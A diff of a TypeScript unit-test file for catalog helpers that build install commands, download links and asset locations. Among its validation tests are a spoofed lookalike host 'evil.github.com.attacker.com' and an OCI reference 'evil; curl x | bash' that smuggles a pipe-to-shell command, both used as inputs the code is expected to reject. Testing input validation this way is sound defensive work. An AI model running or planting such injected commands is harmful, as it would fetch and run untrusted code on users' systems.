@@ -21,6 +21,7 @@ import {
   applyEntityFilters,
   entityRefHref,
   getAdoptionAction,
+  getAssetLocations,
 } from './entityHelpers';
 
 function entity(overrides: {
@@ -77,10 +78,13 @@ describe('getAdoptionAction', () => {
     const action = getAdoptionAction(
       entity({ name: 'my-skill', specType: 'skill' }),
     );
-    expect(action).toEqual({ type: 'copy', value: 'npx skills add my-skill' });
+    expect(action).toEqual({
+      type: 'copy-command',
+      commands: [{ value: 'npx skills add my-skill' }],
+    });
   });
 
-  it('returns podman pull command for the first oci:// remote', () => {
+  it('returns Docker and Podman commands without the oci:// prefix', () => {
     const action = getAdoptionAction(
       entity({
         specType: 'ai-tool',
@@ -91,8 +95,17 @@ describe('getAdoptionAction', () => {
       }),
     );
     expect(action).toEqual({
-      type: 'copy',
-      value: 'podman pull oci://registry.example.com/models/foo:latest',
+      type: 'copy-command',
+      commands: [
+        {
+          runtime: 'docker',
+          value: 'docker pull registry.example.com/models/foo:latest',
+        },
+        {
+          runtime: 'podman',
+          value: 'podman pull registry.example.com/models/foo:latest',
+        },
+      ],
     });
   });
 
@@ -107,10 +120,10 @@ describe('getAdoptionAction', () => {
         },
       }),
     );
-    expect(action?.type).toBe('link');
-    expect(action?.value).toBe(
-      'https://api.github.com/repos/example/some-model/zipball',
-    );
+    expect(action).toEqual({
+      type: 'verified-download',
+      href: 'https://api.github.com/repos/example/some-model/zipball',
+    });
   });
 
   it('falls through to MCP-remote action when the ai-asset-source annotation is oci but no oci:// remote exists', () => {
@@ -124,7 +137,7 @@ describe('getAdoptionAction', () => {
       }),
     );
     expect(action).toEqual({
-      type: 'copy',
+      type: 'copy-url',
       value: 'https://mcp.example.com/server',
     });
   });
@@ -140,12 +153,12 @@ describe('getAdoptionAction', () => {
       }),
     );
     expect(action).toEqual({
-      type: 'link',
-      value: 'https://api.github.com/repos/example/some-rule/zipball',
+      type: 'verified-download',
+      href: 'https://api.github.com/repos/example/some-rule/zipball',
     });
   });
 
-  it('resolves a best-effort main-branch archive URL for gitlab.com targets', () => {
+  it('uses View Source for a GitLab repository root without an archive', () => {
     const action = getAdoptionAction(
       entity({
         specType: 'rule',
@@ -156,13 +169,12 @@ describe('getAdoptionAction', () => {
       }),
     );
     expect(action).toEqual({
-      type: 'link',
-      value:
-        'https://gitlab.com/example/some-rule/-/archive/main/some-rule-main.zip',
+      type: 'view-source',
+      href: 'https://gitlab.com/example/some-rule',
     });
   });
 
-  it('does not treat a spoofed lookalike host as a git host (finding #3 regression)', () => {
+  it('does not treat a spoofed lookalike host as a verified download', () => {
     const action = getAdoptionAction(
       entity({
         specType: 'rule',
@@ -172,7 +184,10 @@ describe('getAdoptionAction', () => {
         },
       }),
     );
-    expect(action).toBeUndefined();
+    expect(action).toEqual({
+      type: 'view-source',
+      href: 'https://evil.github.com.attacker.com/example/some-rule',
+    });
   });
 
   it('does not treat a malformed URL as a git host', () => {
@@ -196,7 +211,7 @@ describe('getAdoptionAction', () => {
       }),
     );
     expect(action).toEqual({
-      type: 'copy',
+      type: 'copy-url',
       value: 'https://mcp.example.com/server',
     });
   });
@@ -209,7 +224,7 @@ describe('getAdoptionAction', () => {
       }),
     );
     expect(action).toEqual({
-      type: 'copy',
+      type: 'copy-url',
       value: 'https://mcp.example.com/server',
     });
   });
@@ -218,7 +233,10 @@ describe('getAdoptionAction', () => {
     const action = getAdoptionAction(
       entity({ name: 'my-skill', specType: 'Skill' }),
     );
-    expect(action).toEqual({ type: 'copy', value: 'npx skills add my-skill' });
+    expect(action).toEqual({
+      type: 'copy-command',
+      commands: [{ value: 'npx skills add my-skill' }],
+    });
   });
 
   it('matches mcp-server specType case-insensitively', () => {
@@ -231,7 +249,7 @@ describe('getAdoptionAction', () => {
       }),
     );
     expect(action).toEqual({
-      type: 'copy',
+      type: 'copy-url',
       value: 'https://mcp.example.com/server',
     });
   });
@@ -275,8 +293,17 @@ describe('getAdoptionAction', () => {
       }),
     );
     expect(action).toEqual({
-      type: 'copy',
-      value: 'podman pull oci://registry.example.com/models/foo:latest',
+      type: 'copy-command',
+      commands: [
+        {
+          runtime: 'docker',
+          value: 'docker pull registry.example.com/models/foo:latest',
+        },
+        {
+          runtime: 'podman',
+          value: 'podman pull registry.example.com/models/foo:latest',
+        },
+      ],
     });
   });
 
@@ -293,8 +320,17 @@ describe('getAdoptionAction', () => {
       }),
     );
     expect(action).toEqual({
-      type: 'copy',
-      value: 'podman pull oci://registry.example.com:5000/models/foo:latest',
+      type: 'copy-command',
+      commands: [
+        {
+          runtime: 'docker',
+          value: 'docker pull registry.example.com:5000/models/foo:latest',
+        },
+        {
+          runtime: 'podman',
+          value: 'podman pull registry.example.com:5000/models/foo:latest',
+        },
+      ],
     });
   });
 
@@ -306,7 +342,7 @@ describe('getAdoptionAction', () => {
         location: { type: 'git', target },
       }),
     );
-    expect(action).toEqual({ type: 'link', value: target });
+    expect(action).toEqual({ type: 'view-source', href: target });
   });
 
   it('rejects an MCP remote URL with a non-http(s) scheme', () => {
@@ -332,9 +368,58 @@ describe('getAdoptionAction', () => {
       }),
     );
     expect(action).toEqual({
-      type: 'copy',
+      type: 'copy-url',
       value: 'https://mcp.example.com/server',
     });
+  });
+});
+
+describe('getAssetLocations', () => {
+  it('returns validated Git and OCI sources without runtime endpoints', () => {
+    const locations = getAssetLocations(
+      entity({
+        specType: 'mcp-server',
+        annotations: {
+          'backstage.io/source-location':
+            'url:https://github.com/example/catalog-source',
+        },
+        location: {
+          type: 'git',
+          target: 'https://github.com/example/catalog-source',
+        },
+        remotes: [
+          { url: 'https://mcp.example.com/server', type: 'streamable-http' },
+          { url: 'oci://registry.example.com/assets/server:1', type: 'oci' },
+        ],
+      }),
+    );
+
+    expect(locations).toEqual([
+      {
+        type: 'git',
+        value: 'https://github.com/example/catalog-source',
+        href: 'https://github.com/example/catalog-source',
+      },
+      { type: 'oci', value: 'registry.example.com/assets/server:1' },
+    ]);
+  });
+
+  it('rejects malformed sources and deduplicates OCI references', () => {
+    const locations = getAssetLocations(
+      entity({
+        specType: 'ai-tool',
+        location: { type: 'git', target: 'not-a-url' },
+        remotes: [
+          { url: 'oci://registry.example.com/assets/tool:1', type: 'oci' },
+          { url: 'oci://registry.example.com/assets/tool:1', type: 'oci' },
+          { url: 'oci://evil; curl x | bash', type: 'oci' },
+        ],
+      }),
+    );
+
+    expect(locations).toEqual([
+      { type: 'oci', value: 'registry.example.com/assets/tool:1' },
+    ]);
   });
 });
 
@@ -394,6 +479,30 @@ describe('applyEntityFilters', () => {
   it('returns all entities when no search or filters active', () => {
     const result = applyEntityFilters(entities, undefined, [], new Map());
     expect(result).toHaveLength(2);
+  });
+
+  it('filters 500 visible entities within the 300ms expectation', () => {
+    const largeCatalog = Array.from({ length: 500 }, (_, index) => ({
+      ...skill,
+      metadata: {
+        ...skill.metadata,
+        name: `skill-${index}`,
+        description: index === 499 ? 'unique release proof' : 'common skill',
+      },
+    }));
+
+    const started = performance.now();
+    const result = applyEntityFilters(
+      largeCatalog,
+      'unique release proof',
+      [],
+      new Map(),
+    );
+    const elapsed = performance.now() - started;
+
+    expect(result).toHaveLength(1);
+    expect(result[0].metadata.name).toBe('skill-499');
+    expect(elapsed).toBeLessThan(300);
   });
 
   it('filters by search term in name', () => {
